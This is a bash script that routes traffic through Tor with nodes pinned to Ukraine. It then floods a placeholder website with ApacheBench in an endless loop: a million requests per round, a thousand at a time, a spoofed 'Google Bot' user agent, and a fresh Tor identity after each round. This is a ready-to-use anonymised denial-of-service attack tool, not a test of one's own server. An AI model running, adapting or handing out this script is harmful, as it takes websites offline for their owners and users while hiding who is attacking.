#!/bin/bash

SITE_URL="https://<web_site>/"
#
TORIPTABLES_ENABLE=true
TOR_ENTRYNODES="ua"
TOR_EXITNODES="ua"
#
NUMBER_REQUEST=1000000
NUMBER_CONCURRENCY=1000
USER_AGENT="User-Agent: Google Bot"

#-----------------------------
# System update

echo "--- System update ---"
sudo apt update

#-----------------------------
# Install Toriptables

if $TORIPTABLES_ENABLE ; then
  echo "--- Install tor ---"
  sudo apt install tor -y

  if [ -n "${TOR_ENTRYNODES}" ]; then
    echo "--- Tor config EntryNodes ---"
    echo "EntryNodes {${TOR_ENTRYNODES}}" | sudo tee --append /etc/tor/torrc > /dev/null
  fi

  if [ -n "${TOR_EXITNODES}" ]; then
    echo "--- Tor config ExitNodes ---"
    echo "ExitNodes {${TOR_EXITNODES}}" | sudo tee --append /etc/tor/torrc > /dev/null
  fi

  echo "--- Start tor ---"
  sudo systemctl start tor
  sudo systemctl enable tor

  echo "--- Load toriptables ---"
  sudo apt install git -y
  sudo git clone https://github.com/ruped24/toriptables2
  cd toriptables2/

  sudo apt install python2 -y
  sudo python2 toriptables2.py -l
  sleep 5
fi

#-----------------------------
# Install Apache benchmark

echo "--- Install benchmark ---"
sudo apt install apache2-utils -y

echo "--- Start benchmark ---"
for ((;;))
do
  ab -n $NUMBER_REQUEST -c $NUMBER_CONCURRENCY -k -r -H "${USER_AGENT}" $SITE_URL
  #
  echo "--- Restart benchmark ---"
  sudo python2 toriptables2.py -r
  sleep 5
done
                                        
